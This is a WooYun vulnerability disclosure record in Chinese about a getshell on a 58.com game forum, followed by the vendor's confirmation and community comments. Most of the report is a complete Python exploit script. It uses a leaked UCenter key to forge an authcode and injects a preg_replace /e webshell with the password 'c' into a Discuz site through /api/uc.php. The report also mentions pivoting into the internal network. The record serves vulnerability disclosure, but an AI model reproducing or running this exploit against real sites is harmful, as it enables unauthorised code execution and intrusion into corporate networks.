{"id": 87224, "wybug_id": "wooyun-2016-0195871", "wybug_title": "58同城某处问题导致Getshell直入大内网", "wybug_corp": "58同城", "wybug_author": "sqlfeng", "wybug_date": "2016-04-13 16:46", "wybug_open_date": "2016-05-29 10:40", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-29：\t细节向公众公开  简要描述： 呜啦啦啦 详细说明：   WooYun: 58 游戏论坛后台弱口令可导致getshell 看到这个洞,陷入了沉思啊..想起了大表哥的姿势,于是我也试试~http://bbs.wan.58.com//config/config_ucenter.php.bak返回空.难不成执行了？连接试试,果然运气没那么好...再试试里面泄露的UCkey吧,试试getshell附脚本\nimport sysimport hashlibimport timeimport mathimport base64import urllib2import urllibimport reimport requestsimport jsonglobal cookieglobal formhashdef microtime(get_as_float = False) :    if get_as_float:        return time.time()    else:        return '%.8f %d' % math.modf(time.time())def get_authcode(string, key = ''):    ckey_length = 4    key = hashlib.md5(key).hexdigest()    keya = hashlib.md5(key[0:16]).hexdigest()    keyb = hashlib.md5(key[16:32]).hexdigest()    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()    key_length = len(cryptkey)    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string    string_length = len(string)    result = ''    box = range(0, 256)    rndkey = dict()    for i in range(0,256):        rndkey[i] = ord(cryptkey[i % key_length])    j=0    for i in range(0,256):        j = (j + box[i] + rndkey[i]) % 256        tmp = box[i]        box[i] = box[j]        box[j] = tmp    a=0    j=0    for i in range(0,string_length):        a = (a + 1) % 256        j = (j + box[a]) % 256        tmp = box[a]        box[a] = box[j]        box[j] = tmp        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))        length=len(result)    return keyc + base64.b64encode(result).replace('=', '')def get_cookie_formhash(host):    global cookie    global formhash    headers = {'content-type': 'application/json'}    r=requests.get(host,headers=headers)    cookie=r.cookies    hash=re.findall(r'formhash\" value=\"[0-9A-z]{1,10}\"',r.text)    _formhash=re.findall(r'\"[0-9A-z]{1,10}\"',hash[0])    formhash=_formhash[0].replace('\"','')def getshell(host,key):    global cookie    global formhash    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}    tm=time.time()+10*3600    agent=hashlib.md5(\"Mozilla/5.0 (Windows NT 6.1; WOW64)\")    string=\"agent=%s&time=%s&action=updatebadwords\" % (agent,tm)    code=urllib.quote(get_authcode(string,key))    get_cookie_formhash(host)    url=\"%s/api/uc.php?code=%s&formhash=%s\" % (host,code,formhash)    payload='''<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"0\"><item id=\"findpattern\">/admin/e</item>  <item id=\"replacement\">@preg_replace(chr(47).chr(47).chr(101),$_POST[c],chr(098));</item>  </item></root>'''    r=requests.post(url,data=payload,cookies=cookie,headers=header)    print url    print r.text    if re.findall('^1',r.text):        print 'success shell is %s/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkusername&username=admin    password is c' % (host)if __name__ == '__main__':    commands=sys.argv[1:2]    keys=sys.argv[2:]    args=\"\".join(commands)    argss=\"\".join(keys)    print args,argss    if len(args) < 5:        sys.exit()    else:        getshell(args,argss)\n使用方法 xxx.py url  uckey成功getshell   漏洞证明：  \n\n\n\n在内网,都知道赶集58在一起嘿嘿简单探测一下reg+sockscap可以轻松实现不贴图了,最近好累,干什么事都提不起精神,不知道为什么 ~   修复方案：     版权声明：转载请注明来源 sqlfeng@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-04-14 10:36 厂商回复： 感谢您的反馈，我们已安排专人处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-13 16:54 |    \t\t包包 \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:34        | 我是菜鸟，我怕谁？小弟新来，望大牛多多包...)\t\t \n  666    \n     2016-04-13 16:58 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:623 漏洞数:78        | 慢慢来,不急)\t\t \n  @包包 999    \n     2016-04-13 17:05 |    \t\t高小厨  \t\t\t( 普通白帽子  |\t\t\t        Rank:978 漏洞数:90        | 不会吹牛的小二不是好厨子！)\t\t \n  777    \n     2016-04-13 17:23 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:33        | 开发真是日了狗了)\t\t \n  888    \n     2016-04-13 17:25 |    \t\tzone \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:17        | as as－ as you  wish)\t\t \n  表哥999    \n     2016-04-13 18:22 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:804 漏洞数:104        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  最近好多内网，求大神帮我们也测测    \n     2016-04-13 18:34 |    \t\t0h1in9e \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:19        | 林歌 | 峨眉山下修炼中的<网络安全></web开...)\t\t \n  膜拜啊！    \n     2016-04-13 20:02 |    \t\t包包 \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:34        | 我是菜鸟，我怕谁？小弟新来，望大牛多多包...)\t\t \n  @sqlfeng 大神6翻了    \n     2016-04-13 23:09 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:468 漏洞数:57        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  风哥太猛了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}